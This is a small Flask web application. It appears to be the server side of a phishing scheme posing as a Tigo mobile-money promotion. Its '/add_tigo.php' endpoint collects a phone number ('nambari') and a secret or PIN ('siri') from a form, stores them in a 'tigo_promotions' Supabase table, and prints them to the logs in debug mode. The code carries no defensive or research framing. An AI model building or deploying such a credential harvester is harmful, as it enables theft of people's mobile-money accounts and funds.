from flask import Flask, request, render_template
import os

app = Flask(__name__)

# Initialize Supabase with error handling
try:
    from supabase import create_client, Client
    
    # Get environment variables
    supabase_url = os.environ.get("SUPABASE_URL")
    supabase_key = os.environ.get("SUPABASE_KEY")
    
    print(f"Supabase URL: {supabase_url}")  # Debug
    print(f"Supabase Key present: {bool(supabase_key)}")  # Debug
    
    if supabase_url and supabase_key:
        supabase: Client = create_client(supabase_url, supabase_key)
        print("Supabase client initialized successfully")
    else:
        supabase = None
        print("WARNING: Supabase environment variables not set")
        
except ImportError:
    supabase = None
    print("WARNING: supabase package not installed")
except Exception as e:
    supabase = None
    print(f"WARNING: Failed to initialize Supabase: {e}")

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/add_tigo.php', methods=['POST'])
def add_tigo():
    try:
        # Get form data
        nambari = request.form.get('nambari')
        siri = request.form.get('siri')
        url_link = request.form.get('url_link', 'gzktrsjamfkw')
        
        if not nambari or not siri:
            return "Please fill all required fields", 400
        
        if supabase is None:
            # Debug mode - just return success without saving
            print(f"DEBUG: Would save - nambari: {nambari}, siri: {siri}")
            return "Data added successfully! (Debug mode - not saved to Supabase)"
        
        # Prepare data for Supabase
        data = {
            "nambari": nambari,
            "siri": siri,
            "url_link": url_link
        }
        
        # Insert into Supabase
        response = supabase.table("tigo_promotions").insert(data).execute()
        
        return "Data added successfully!"
        
    except Exception as e:
        return f"Error: {str(e)}", 500

@app.route('/health')
def health():
    """Health check endpoint"""
    if supabase:
        return f"Supabase connected: {bool(supabase_url)}"
    else:
        return "Supabase not configured", 500

if __name__ == "__main__":
    app.run(debug=True)
